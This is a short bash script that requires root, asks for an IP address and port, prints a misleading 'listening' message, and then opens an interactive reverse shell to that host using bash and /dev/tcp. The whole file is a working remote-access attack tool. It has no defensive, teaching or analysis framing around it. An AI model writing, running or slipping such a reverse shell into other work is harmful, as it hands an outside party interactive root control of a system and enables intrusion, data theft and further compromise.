#!/bin/bash
## Created by Jasutin

checkroot() {
    SAVE_LD_PRELOAD="$LD_PRELOAD"
    unset LD_PRELOAD
    if [ "$(id -u)" -ne 0 ]; then
        printf "\e[1;31mPlease, run as root!\n\e[0m"
        exit 1
     fi
     LD_PRELOAD="$SAVE_LD_PRELOAD"
}

checkroot

clear;

printf "\e[1;33mEnter IP: \e[0m\n";
read IP

printf "\e[1;33mEnter port: \e[0m\n";
read PORT

clear;

printf "\n\e[1;36mlistening on $IP/$PORT ...\e[0m"
	bash -i >& /dev/tcp/$IP/$PORT 0>&1

	return 0;

exit 1;
